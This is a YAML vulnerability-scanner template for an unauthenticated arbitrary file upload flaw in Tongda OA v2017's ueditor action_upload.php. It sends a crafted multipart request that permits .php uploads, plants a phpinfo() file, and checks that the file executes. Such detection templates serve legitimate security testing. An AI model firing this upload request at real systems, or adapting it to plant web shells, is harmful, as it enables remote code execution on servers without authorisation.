expression: r0() && r1()
id: tongda-v2017-uploadfile
info:
    author: zan8in
    description: |
        通达OA v2017 action_upload.php 文件过滤不足且无需后台权限，导致任意文件上传漏洞
        app="TDXK-通达OA"
    name: 通达OA v2017 action_upload.php 任意文件上传漏洞
    reference:
        - http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v2017%20action_upload.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
    severity: critical
    tags:
        - ueditor
        - 通达oa
        - TDXK-通达OA
        - phpinfo
        - tongda
    verified: false
rules:
    r0:
        request:
            body: "------------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"CONFIG[fileFieldName]\"\r\n\r\nffff\r\n------------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"CONFIG[fileMaxSize]\"\r\n\r\n1000000000\r\n------------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"CONFIG[filePathFormat]\"\r\n\r\ntcmd\r\n------------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"CONFIG[fileAllowFiles][]\"\r\n\r\n.php\r\n------------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"ffff\"; filename=\"{{rand1}}.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php phpinfo();?>\r\n------------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"mufile\"\r\n\r\nsubmit\r\n------------WebKitFormBoundary{{rboundary}}--\r\n"
            expression: response.status == 200
            headers:
                Content-Type: multipart/form-data; boundary=----------WebKitFormBoundary{{rboundary}}
            method: POST
            path: /module/ueditor/php/action_upload.php?action=uploadfile
    r1:
        expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
        request:
            method: GET
            path: /{{rand1}}.php
set:
    md5str: md5(rand1)
    rand1: randomLowercase(12)
    rboundary: randomLowercase(8)
